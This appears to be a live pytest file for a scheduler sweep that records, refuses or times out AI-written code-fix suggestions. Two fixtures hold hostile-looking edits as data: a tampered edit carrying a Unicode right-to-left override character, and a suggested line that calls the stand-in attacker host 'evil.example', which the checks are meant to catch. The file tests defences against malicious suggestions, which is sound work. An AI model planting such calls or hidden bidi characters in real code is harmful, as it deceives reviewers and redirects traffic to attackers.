"""Rung 3's sweep records each new result once, through the real AI account (F5 plan T4.8;
design, *The sweep*, steps 1 and 3, *Tamper signals*; spec D18, D46; AC39's audit half,
AC64's marking half).

The suggestion is written by the proposal job as `nexovue_insight`, then swept as the
install account, as beat runs it. Each test's sweep is narrowed to its own organization
(`only_org`) and runs on the test's own clock, so it never reaches another test's rows.
"""

from __future__ import annotations

from datetime import datetime, timedelta
from typing import Any

from alert_fixtures import AlertTenant, postgres_reachable
from live import require_stack
from nexovue_platform import ai_records
from nexovue_platform.fixes.records import CALL_SECONDS_LONGEST, FIX_CHECKS_REFUSED, FIX_WITHHELD
from propose_fix_fixtures import PATH, a_proposing_fix, edit, edits_answer, pack_left, run_propose
from recording_site import RecordingSite
from sqlalchemy import text
from sqlalchemy.ext.asyncio import AsyncEngine
from wording_fixtures import CHAT_PATH, connect, finding, openai_reply

from nexovue_scheduler.connections import fix_sweep

require_stack(
    reachable=postgres_reachable(),
    suite="apps/scheduler/tests/test_fix_sweep_records_live.py",
    remedy="Postgres is not reachable — run `just up`",
)


async def _written(
    install: AsyncEngine,
    engine: AsyncEngine,
    site: RecordingSite,
    tenant: AlertTenant,
    at: datetime,
    answer: dict[str, Any],
) -> str:
    connected = await connect(install, tenant, site, now=at)
    made = await a_proposing_fix(install, tenant, await finding(install, tenant, now=at), at=at)
    site.replies[CHAT_PATH] = openai_reply(answer)
    await run_propose(engine, connected, made.fix_id, at=at)
    return made.fix_id


async def _sweep(jobs: AsyncEngine, tenant: AlertTenant, at: datetime) -> None:
    """Rung 3's sweep, as `scheduler-connections` signs in: the tracker account (T8.7)."""
    await fix_sweep.sweep(jobs, clock=lambda: at, only_org=str(tenant.org_id))


async def _row(install: AsyncEngine, fix_id: str) -> Any:
    async with install.connect() as connection:
        return (
            await connection.execute(
                text(
                    "SELECT state, reason, edits, files_read, withheld_refs, email_due, "
                    "result_recorded_at, code_deleted_reason FROM finding_fixes WHERE id = :id"
                ),
                {"id": fix_id},
            )
        ).one()


async def _events(install: AsyncEngine, tenant: AlertTenant) -> list[Any]:
    async with install.connect() as connection:
        return list(
            await connection.execute(
                text("SELECT kind, detail FROM finding_events WHERE org_id = :org"),
                {"org": tenant.org_id},
            )
        )


async def _audit(install: AsyncEngine, tenant: AlertTenant, action: str) -> list[Any]:
    async with install.connect() as connection:
        return list(
            await connection.execute(
                text("SELECT detail FROM audit_log WHERE org_id = :org AND action = :action"),
                {"org": tenant.org_id, "action": action},
            )
        )


def test_the_sweep_s_longest_call_is_f3_s() -> None:
    assert CALL_SECONDS_LONGEST == ai_records.CALL_SECONDS_MAX


async def test_t4_8_a_written_suggestion_is_recorded_once_and_owes_its_requester_an_email(
    ai_install: AsyncEngine,
    connections_engine: AsyncEngine,
    ai_engine: AsyncEngine,
    provider_site: RecordingSite,
    ai_tenant: AlertTenant,
    now: datetime,
) -> None:
    fix = await _written(ai_install, ai_engine, provider_site, ai_tenant, now, edits_answer())

    await _sweep(connections_engine, ai_tenant, now)
    await _sweep(connections_engine, ai_tenant, now)

    row = await _row(ai_install, fix)
    assert row.state == "proposed" and row.edits is not None
    assert row.result_recorded_at == now and row.email_due is True
    [(kind, detail)] = await _events(ai_install, ai_tenant)
    assert kind == "fix_proposed"
    assert detail == {"fix_id": fix, "fix_kind": "source", "step_count": 1}


async def test_d18_a_suggestion_changed_after_the_ai_wrote_it_is_refused_and_audited(
    ai_install: AsyncEngine,
    connections_engine: AsyncEngine,
    ai_engine: AsyncEngine,
    provider_site: RecordingSite,
    ai_tenant: AlertTenant,
    now: datetime,
) -> None:
    fix = await _written(ai_install, ai_engine, provider_site, ai_tenant, now, edits_answer())
    # As a broken-into AI room could: a new address planted into the stored edit.
    async with ai_install.begin() as connection:
        await connection.execute(
            text(
                "UPDATE finding_fixes SET edits = jsonb_set(edits, '{0,new_text}', "
                "to_jsonb('    return gateway.charge(amount)  # \u202e\\n'::text)) "
                "WHERE id = :id"
            ),
            {"id": fix},
        )

    await _sweep(connections_engine, ai_tenant, now)

    row = await _row(ai_install, fix)
    assert (row.state, row.reason) == ("failed", "checks_refused_at_click")
    assert row.edits is None and row.code_deleted_reason == "ended_short"
    assert await _events(ai_install, ai_tenant) == []
    [audited] = await _audit(ai_install, ai_tenant, FIX_CHECKS_REFUSED)
    assert audited.detail == {"fix_id": fix}


async def test_t4_8_a_rule_s_refusal_is_audited_with_the_files_it_named_and_its_code_cleared(
    ai_install: AsyncEngine,
    connections_engine: AsyncEngine,
    ai_engine: AsyncEngine,
    provider_site: RecordingSite,
    ai_tenant: AlertTenant,
    now: datetime,
) -> None:
    answer = edits_answer(edit(new_text="    call('https://evil.example/pay')\n"))
    fix = await _written(ai_install, ai_engine, provider_site, ai_tenant, now, answer)

    await _sweep(connections_engine, ai_tenant, now)
    await _sweep(connections_engine, ai_tenant, now)

    row = await _row(ai_install, fix)
    assert (row.state, row.reason) == ("refused", "withheld_K6")
    assert row.files_read is None and row.withheld_refs is None
    [audited] = await _audit(ai_install, ai_tenant, FIX_WITHHELD)
    assert audited.detail == {"fix_id": fix, "rule": "K6", "files": [PATH]}
    assert row.email_due is True


async def test_t4_8_a_row_stuck_proposing_past_every_attempt_ends_with_its_pack_gone(
    ai_install: AsyncEngine,
    connections_engine: AsyncEngine,
    provider_site: RecordingSite,
    ai_tenant: AlertTenant,
    now: datetime,
) -> None:
    await connect(ai_install, ai_tenant, provider_site, now=now)
    made = await a_proposing_fix(
        ai_install, ai_tenant, await finding(ai_install, ai_tenant, now=now), at=now
    )
    younger = now + fix_sweep.PROPOSING_STUCK_AFTER - timedelta(seconds=1)

    await _sweep(connections_engine, ai_tenant, younger)
    assert (await _row(ai_install, made.fix_id)).state == "proposing"

    await _sweep(
        connections_engine, ai_tenant, now + fix_sweep.PROPOSING_STUCK_AFTER + timedelta(seconds=1)
    )
    row = await _row(ai_install, made.fix_id)
    assert (row.state, row.reason) == ("failed", "timed_out")
    assert await pack_left(ai_install, made.fix_id) is None
